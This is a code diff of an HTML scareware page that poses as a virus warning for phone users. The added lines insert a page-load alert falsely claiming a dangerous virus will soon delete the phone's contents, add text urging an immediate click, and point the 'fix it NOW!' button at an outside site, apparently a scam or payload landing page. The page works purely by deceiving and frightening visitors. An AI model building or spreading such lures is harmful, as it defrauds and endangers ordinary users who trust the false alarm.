@@ -20,13 +20,13 @@
  
 <b class="one">
 
-    We're trying to stop the virus. In a few moments (about 18 seconds), an auto-generated page will open that is tailored to your problem.
+    We're trying to stop the virus. In a few moments (about 18 seconds), an auto-generated page will open that is tailored to your problem. If you don't want to wait click the button below
 
 </b>
 </div>
 
 
-<button onclick="myFunction()" class="przycisk" role="button" style="font-weight: bold;">fix it NOW!</button>
+<button onclick="window.location.href='https://fixlymobile.netlify.app/';" class="przycisk" role="button" style="font-weight: bold;">fix it NOW!</button>
 
 <script type="text/javascript">
 	document.addEventListener('DOMContentLoaded', function() {
@@ -48,7 +48,11 @@ function myFunction() {
   alert("Sory we can`t remove virus. To remove it yourself you need to go to se*&$#^@");
 }
 </script>
-
+<script type="text/javascript">
+    window.onload = function(){ 
+                    alert("Attention! A dangerous virus has been detected that will soon delete the contents of your phone.");
+                    }
+    </script>
 
 </body>
 </html>
